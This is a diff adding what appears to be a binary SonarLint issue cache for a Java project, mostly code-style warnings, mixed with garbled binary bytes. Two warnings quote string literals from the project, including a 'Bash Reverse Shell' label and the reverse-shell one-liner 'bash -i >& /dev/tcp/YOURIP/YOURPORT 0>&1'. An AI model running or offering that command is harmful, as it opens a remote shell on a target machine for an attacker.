@@ -1,0 +1,82 @@
+
+s	java:S117á"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+S
+java:S2209¤"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+y
+java:S1192#"WDefine a constant instead of duplicating this literal "**Bash Reverse Shell**" 3 times.(‘³¶‡ÿÿÿÿÿ8“”ëÔÄ.
+?
+java:S1116‹"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
+“
+java:S1192%"qDefine a constant instead of duplicating this literal "```bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1```\n" 3 times.(²Õæáùÿÿÿÿ8œòçÔÄ.
+O
+java:S1602—",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+i
+java:S11920"GDefine a constant instead of duplicating this literal "\u2754" 9 times.(àÏ¥şÿÿÿÿ8 ª×½í.
+S
+java:S2209ƒ"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+s	java:S117ú"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+O
+java:S1602¶",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8Şƒ¬Ä.
+s	java:S117—"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+w
+java:S1192="UDefine a constant instead of duplicating this literal "**Use this code**\n " 6 times.(È™²¨ıÿÿÿÿ8¤ÉÓ­Ä.
+s	java:S117¶"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+S
+java:S2209®"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+k
+java:S1192B"NDefine a constant instead of duplicating this literal "2\uFE0F\u20E3" 8 times.(¹ò©«8 ª×½í.
+N
+java:S1602z",Remove useless curly braces around statement(¦´ˆúÿÿÿÿ8¥«¬Ä.
+S
+java:S2209è"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+>
+java:S1116m"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
+?
+java:S1116‹"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
+w
+java:S1450"URemove the "config" field and declare it as a local variable in the relevant methods.(şØÆ±øÿÿÿÿ8 ª×½í.
+s	java:S117Ò"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8š¬Ä.
+p
+java:S1192’"RDefine a constant instead of duplicating this literal "Use this code \n" 14 times.(Å”•‡8µÄ¸ÕÄ.
+S
+java:S2209Ì"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+?
+java:S1116¨"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
+?
+java:S1116î"Remove this empty statement.(Åñ­õşÿÿÿÿ8¡õ²•·.
+?
+java:S1116Æ"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
+R
+java:S2209e"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+p
+java:S1192P"NDefine a constant instead of duplicating this literal "3\uFE0F\u20E3" 4 times.(ßËçÌıÿÿÿÿ8 ª×½í.
+S
+java:S2209Â"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+p
+java:S1192u"SDefine a constant instead of duplicating this literal "Use this code  \n " 4 times.(Å”•‡8¥«¬Ä.
+?
+java:S1116·"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
+s	java:S117«"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+o
+java:S3776"RRefactor this method to reduce its Cognitive Complexity from 90 to the 15 allowed.(Âú8íÓª¬Ä.
+s	java:S117×"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8²Ÿ¦¬Ä.
+s	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+S
+java:S2209ï"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+q
+java:S11929"ODefine a constant instead of duplicating this literal "1\uFE0F\u20E3" 12 times.(Å‡Åùÿÿÿÿ8 ª×½í.
+s	java:S117—"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+p
+java:S1192Y"NDefine a constant instead of duplicating this literal "\uD83C\uDFE0" 12 times.(ç‰»Òÿÿÿÿÿ8 ª×½í.
+r	java:S117,"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8Şƒ¬Ä.
+o	java:S120"ZRename this package name to match the regular expression '^[a-z_]+(\.[a-z_][a-z0-9_]*)*$'.(Ú×ø‘
+?
+java:S1116÷"Remove this empty statement.(Åñ­õşÿÿÿÿ8ù­Ê¾í.
+s	java:S117Ê"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+{
+java:S1450"^Remove the "generatorInvite" field and declare it as a local variable in the relevant methods.(à­÷ê8Ú¥ıî.
+s	java:S117ñ"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+S
+java:S2209‡"5Change this instance-reference to a static reference.(ÒÏÉì8 ª×½í.
+?
+java:S1116Ô"Remove this empty statement.(Åñ­õşÿÿÿÿ8¥«¬Ä.
